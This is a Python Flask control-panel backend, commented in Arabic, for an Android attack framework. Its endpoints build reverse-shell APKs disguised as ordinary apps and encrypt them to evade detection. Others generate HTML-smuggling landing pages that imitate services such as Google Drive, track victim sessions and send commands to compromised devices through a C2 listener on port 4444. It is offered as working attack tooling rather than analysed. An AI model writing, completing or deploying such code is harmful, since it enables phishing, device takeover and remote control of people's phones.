#!/usr/bin/env python3
"""
UAMS Backend - لوحة التحكم الرئيسية
إطار عمل متكامل لإدارة الهجمات
"""

from flask import Flask, render_template, request, jsonify, session, send_file
from flask_cors import CORS
import os
import sys
import json
import threading
from datetime import datetime

# إضافة مسارات النظام
sys.path.append('builder_engine')
sys.path.append('crypter_engine')
sys.path.append('c2_listener')
sys.path.append('utils')

# استيراد وحداتنا
from apk_builder import APKBuilder
from encrypter import AdvancedEncrypter
from html_generator import LandingPageGenerator
from c2_listener import C2Listener

app = Flask(__name__, 
            template_folder='templates',
            static_folder='static')
app.secret_key = 'UAMS_SECRET_KEY_2024'
CORS(app)

class UAMSBackend:
    def __init__(self):
        self.active_listeners = {}
        self.payloads_history = []
        self.sessions = {}
        
    def start(self):
        """تشغيل النظام"""
        print("[+] بدء تشغيل UAMS Framework")
        self.load_config()
        self.start_c2_daemon()
        
    def load_config(self):
        """تحميل إعدادات النظام"""
        self.config = {
            'web_port': 8080,
            'c2_port': 4444,
            'encryption_key': 'UAMS_ENCRYPTION_2024',
            'allowed_ips': ['127.0.0.1', '192.168.1.0/24']
        }
        
    def start_c2_daemon(self):
        """تشغيل خادم C2 في الخلفية"""
        def c2_thread():
            listener = C2Listener(port=self.config['c2_port'])
            listener.start()
            
        thread = threading.Thread(target=c2_thread, daemon=True)
        thread.start()
        print(f"[+] C2 Listener يعمل على منفذ {self.config['c2_port']}")

# إنشاء كائن النظام
uams = UAMSBackend()

@app.route('/')
def dashboard():
    """لوحة التحكم الرئيسية"""
    stats = {
        'total_payloads': len(uams.payloads_history),
        'active_listeners': len(uams.active_listeners),
        'active_sessions': len(uams.sessions),
        'system_status': 'Online'
    }
    return render_template('dashboard.html', stats=stats)

@app.route('/builder')
def builder_page():
    """صفحة بناء APK"""
    return render_template('builder.html')

@app.route('/api/build_apk', methods=['POST'])
def build_apk():
    """API لبناء APK"""
    try:
        data = request.json
        ip = data.get('ip', '192.168.1.100')
        port = data.get('port', 4444)
        app_name = data.get('app_name', 'GameApp')
        icon = data.get('icon', 'default')
        
        # استخدام محرك البناء
        builder = APKBuilder()
        apk_path = builder.build_reverse_shell(
            target_ip=ip,
            target_port=port,
            app_name=app_name,
            icon_type=icon
        )
        
        # تسجيل في التاريخ
        uams.payloads_history.append({
            'type': 'apk',
            'ip': ip,
            'port': port,
            'timestamp': datetime.now().isoformat(),
            'path': apk_path
        })
        
        return jsonify({
            'success': True,
            'message': 'تم بناء APK بنجاح',
            'path': apk_path,
            'download_url': f'/download/{os.path.basename(apk_path)}'
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/generate_landing', methods=['POST'])
def generate_landing():
    """إنشاء صفحة هبوط مموهة"""
    try:
        data = request.json
        apk_path = data['apk_path']
        template = data.get('template', 'google_drive')
        encryption = data.get('encryption', 'xor')
        
        # 1. تشفير APK
        crypter = AdvancedEncrypter()
        if encryption == 'xor':
            encrypted_data = crypter.xor_encrypt_file(apk_path)
        elif encryption == 'aes':
            encrypted_data = crypter.aes_encrypt_file(apk_path)
        else:
            encrypted_data = crypter.b64_encode_file(apk_path)
        
        # 2. إنشاء صفحة HTML
        generator = LandingPageGenerator()
        html_content = generator.create_smuggling_page(
            encrypted_data=encrypted_data,
            template_name=template,
            file_name=os.path.basename(apk_path)
        )
        
        # 3. حفظ الصفحة
        output_path = f'generated_pages/{template}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.html'
        os.makedirs('generated_pages', exist_ok=True)
        
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return jsonify({
            'success': True,
            'message': 'تم إنشاء صفحة التهريب',
            'path': output_path,
            'preview_url': f'/preview/{os.path.basename(output_path)}'
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/c2/sessions')
def get_sessions():
    """الحصول على الجلسات النشطة"""
    sessions_list = []
    for session_id, session_data in uams.sessions.items():
        sessions_list.append({
            'id': session_id,
            'ip': session_data.get('ip', 'Unknown'),
            'device': session_data.get('device', 'Android'),
            'connected_at': session_data.get('timestamp'),
            'status': 'Active'
        })
    
    return jsonify({'sessions': sessions_list})

@app.route('/api/c2/command', methods=['POST'])
def send_command():
    """إرسال أمر لجهاز الضحية"""
    try:
        data = request.json
        session_id = data['session_id']
        command = data['command']
        
        if session_id in uams.sessions:
            # هنا راح نرسل الأمر عبر الـ C2 Listener
            # (التنفيذ الفعلي في الجزء الخاص بالـ C2)
            result = f"تم تنفيذ الأمر: {command}"
            
            return jsonify({
                'success': True,
                'result': result
            })
        else:
            return jsonify({'success': False, 'error': 'الجلسة غير موجودة'})
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/download/<filename>')
def download_file(filename):
    """تنزيل الملفات المولدة"""
    file_path = os.path.join('payloads', filename)
    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)
    return "الملف غير موجود", 404

@app.route('/preview/<filename>')
def preview_page(filename):
    """معاينة صفحة HTML"""
    file_path = os.path.join('generated_pages', filename)
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            return f.read()
    return "الصفحة غير موجودة", 404

if __name__ == '__main__':
    # بدء النظام
    uams.start()
    
    # تشغيل خادم الويب
    print(f"[+] بدء لوحة التحكم على http://127.0.0.1:8080")
    app.run(host='0.0.0.0', port=8080, debug=True)